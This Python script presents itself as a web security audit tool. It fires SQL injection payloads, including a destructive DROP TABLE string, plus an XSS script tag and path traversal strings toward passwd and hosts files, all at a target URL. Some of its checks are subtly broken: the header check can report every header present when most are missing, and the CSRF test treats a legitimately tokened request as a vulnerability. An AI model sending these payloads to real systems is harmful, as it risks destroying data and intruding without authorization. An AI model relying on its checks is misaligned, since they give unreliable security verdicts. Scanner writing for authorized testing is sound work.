import requests
from bs4 import BeautifulSoup
import random
import string
import urllib.parse

# Utility function to generate random strings
def random_string(length=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

# SQL Injection test
class SQLInjectionTest:
    def __init__(self, url):
        self.url = url

    def perform_sql_injection(self):
        payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--", "' OR 'a'='a", "' OR '1'='1' /*", "'; DROP TABLE users; --"]
        for payload in payloads:
            response = requests.get(f"{self.url}?id={payload}")
            if "SQL" in response.text or "error" in response.text:
                print(f"Possible SQL Injection vulnerability detected with payload: {payload}")
                return True
        print("No SQL Injection vulnerabilities detected.")
        return False

# XSS Vulnerability test
class XSSVulnerabilityTest:
    def __init__(self, url):
        self.url = url

    def perform_xss_injection(self):
        payload = "<script>alert('XSS')</script>"
        response = requests.post(self.url, data={'input': payload})
        if payload in response.text:
            print("XSS Vulnerability detected.")
            return True
        print("No XSS Vulnerability detected.")
        return False

# CSRF Attack Test
class CSRFTest:
    def __init__(self, url, session):
        self.url = url
        self.session = session

    def perform_csrf_attack(self):
        token = self.extract_csrf_token()
        if token:
            payload = {'csrf_token': token, 'data': 'malicious_data'}
            response = self.session.post(self.url, data=payload)
            if response.status_code == 200:
                print("CSRF attack simulation successful.")
                return True
        print("CSRF vulnerability not detected.")
        return False

    def extract_csrf_token(self):
        response = self.session.get(self.url)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': 'csrf_token'})['value'] if soup.find('input', {'name': 'csrf_token'}) else None
        return token

# Directory Traversal Vulnerability Test
class DirectoryTraversalTest:
    def __init__(self, url):
        self.url = url

    def perform_directory_traversal_test(self):
        payloads = ['../passwd', '..\\..\\..\\Windows\\system32\\drivers\\etc\\hosts']
        for payload in payloads:
            attack_url = f"{self.url}?file={urllib.parse.quote(payload)}"
            response = requests.get(attack_url)
            if "root:x:" in response.text or "127.0.0.1" in response.text:
                print(f"Directory Traversal vulnerability detected with payload: {payload}")
                return True
        print("No Directory Traversal vulnerability detected.")
        return False

# Function to check HTTP headers for security issues
def check_security_headers(url):
    response = requests.get(url)
    headers = response.headers
    if 'X-Frame-Options' not in headers:
        print("X-Frame-Options header missing.")
    if 'Content-Security-Policy' not in headers:
        print("Content-Security-Policy header missing.")
    if 'X-Content-Type-Options' not in headers:
        print("X-Content-Type-Options header missing.")
    if 'Strict-Transport-Security' not in headers:
        print("Strict-Transport-Security header missing.")
    else:
        print("All critical security headers are present.")

# Function to perform a security audit
def perform_security_audit(url):
    print(f"Performing security audit on {url}")
    
    # Initialize session for CSRF test
    session = requests.Session()

    # SQL Injection test
    sql_test = SQLInjectionTest(url)
    sql_injection_result = sql_test.perform_sql_injection()

    # XSS Vulnerability test
    xss_test = XSSVulnerabilityTest(url)
    xss_result = xss_test.perform_xss_injection()

    # CSRF Test
    csrf_test = CSRFTest(url, session)
    csrf_result = csrf_test.perform_csrf_attack()

    # Directory Traversal test
    directory_traversal_test = DirectoryTraversalTest(url)
    traversal_result = directory_traversal_test.perform_directory_traversal_test()

    # Check HTTP Security Headers
    check_security_headers(url)

    # Summary of results
    print("\nSecurity Audit Summary:")
    print(f"SQL Injection Test: {'Vulnerable' if sql_injection_result else 'Safe'}")
    print(f"XSS Test: {'Vulnerable' if xss_result else 'Safe'}")
    print(f"CSRF Test: {'Vulnerable' if csrf_result else 'Safe'}")
    print(f"Directory Traversal Test: {'Vulnerable' if traversal_result else 'Safe'}")

# Usage
if __name__ == "__main__":
    test_url = "http://website.com/test_endpoint"
    
    # Perform security audit on the target URL
    perform_security_audit(test_url)